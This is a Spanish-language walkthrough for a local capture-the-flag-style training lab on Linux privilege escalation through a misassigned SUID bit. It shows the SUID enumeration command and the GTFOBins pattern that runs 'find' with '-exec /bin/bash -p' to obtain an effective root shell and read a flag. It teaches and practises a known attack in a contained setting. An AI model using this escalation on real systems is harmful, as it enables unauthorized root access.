# 📖 Guía — Lab 2: Escalada de privilegios con SUID

**Categoría:** 🟢 BASIC  
**Técnica:** Enumeración SUID + explotación GTFOBins  
**Dificultad:** ⭐⭐ Fácil-Media  

---

## 🎯 Objetivo

Partiendo de un usuario sin privilegios, escalar a **root** aprovechando  
un binario con el bit SUID mal asignado.

**Flag final:** `/root/flag.txt` (solo legible como root)

---

## 🧠 Conceptos previos

**¿Qué es el bit SUID?**  
En Linux, cada archivo tiene permisos de propietario, grupo y otros.  
El bit SUID (Set User ID) es un permiso especial que hace que un binario  
se ejecute **con los permisos de su propietario**, no del usuario que lo lanza.

Por ejemplo: `/usr/bin/passwd` tiene SUID de root porque necesita escribir  
en `/etc/shadow` (que solo puede modificar root), aunque lo ejecute un usuario normal.

Si ese mismo privilegio se aplica a binarios que permiten ejecutar comandos  
arbitrarios (como `find`, `bash`, `python`...), un atacante puede usarlo  
para obtener una shell como root.

**¿Qué es GTFOBins?**  
Es una web ([gtfobins.github.io](https://gtfobins.github.io)) que cataloga binarios Unix  
y cómo pueden usarse para escalar privilegios, escapar de shells restringidas, etc.  
Es la referencia estándar para este tipo de ataques.

---

## 🚀 Levantar el laboratorio

```bash
./launch.sh lab2
```

O manualmente:
```bash
cd labs/basic/lab2-suid
./build_and_run.sh
```

Conectar al laboratorio:
```bash
ssh -p 2222 lowpriv@127.0.0.1
# Contraseña: user1234
```

---

## 🔍 Solución paso a paso

### Paso 1 — Reconocimiento del sistema

Una vez dentro, oriéntate:

```bash
whoami          # ¿Quién soy?
id              # ¿Qué grupos tengo?
uname -a        # ¿Qué kernel y SO?
ls /home        # ¿Qué otros usuarios existen?
```

---

### Paso 2 — Enumerar binarios con SUID

Este es el comando clave. Busca en todo el sistema archivos con el bit SUID activado:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Desglose del comando:
- `find /` — busca desde la raíz del sistema
- `-perm -4000` — filtra archivos con el bit SUID activado
- `-type f` — solo archivos (no directorios)
- `2>/dev/null` — descarta los errores de "permiso denegado" para limpiar la salida

Verás una lista de binarios. Algunos son normales en cualquier sistema Linux.  
**Uno de ellos no debería tener SUID.**

---

### Paso 3 — Identificar el binario vulnerable

Compara la lista con lo que encuentres en GTFOBins.  
Busca cada binario sospechoso en: `https://gtfobins.github.io`

> 💡 Pista: busca binarios que normalmente se usan para buscar archivos en el sistema y que tienen una opción para ejecutar comandos.

---

### Paso 4 — Explotar el binario

Una vez identificado el binario vulnerable, GTFOBins te da el comando exacto para la sección **SUID**.

El patrón general para el binario de este lab es:

```bash
/ruta/al/binario . -exec /bin/bash -p \; -quit
```

Si funciona, el prompt cambiará. Puede parecer igual, pero fíjate en lo siguiente:

```bash
id
# Busca: euid=0(root)
```

El `euid=0` confirma que tienes privilegios efectivos de root aunque `uid` muestre otro usuario.

---

### Paso 5 — Leer la flag

```bash
cat /root/flag.txt
```

Si ves `Permission denied`, la escalada no funcionó correctamente.  
Vuelve al paso 4 y verifica que el prompt cambió y que `euid=0`.

---

## ✅ Verificación

```bash
id
# uid=1000(lowpriv) gid=1000(lowpriv) euid=0(root) groups=...

cat /root/flag.txt
# FLAG{...}
```

---

## 🧩 ¿Por qué funciona esto?

Cuando ejecutas `find` con SUID de root y usas `-exec /bin/bash -p`,  
estás diciéndole a bash que **preserve los privilegios del proceso que lo lanzó**  
(que en este caso es `find`, ejecutándose como root por el SUID).

La flag `-p` es clave: sin ella, bash moderno descarta los privilegios elevados  
por seguridad cuando detecta que el usuario real y el efectivo son distintos.

---

## 🛠️ Solución de problemas

| Problema | Posible causa | Solución |
|---|---|---|
| `find` no aparece en la lista SUID | Build sin cache | `docker build --no-cache` |
| `bash -p` no da euid=0 | Versión de bash con protecciones | Probar con `bash-p` o verificar con `id` antes de asumir |
| `Permission denied` en `/root/flag.txt` | No se escaló correctamente | Confirmar `euid=0` con `id` |
| Puerto 2222 ocupado | Otro servicio | Cambiar a `-p 2223:22` en el script |
| Contenedor se para solo | Sin claves de host SSH | Añadir `RUN ssh-keygen -A` al Dockerfile |

---

## 📚 Recursos para aprender más

- [GTFOBins](https://gtfobins.github.io) — la biblia de los binarios explotables
- [HackTricks - SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid) — escalada de privilegios en Linux
- [Linux File Permissions](https://www.redhat.com/sysadmin/linux-file-permissions-explained) — entender permisos desde cero

---

*Laboratorio parte del proyecto [Lab Provisioner](../README.md)*
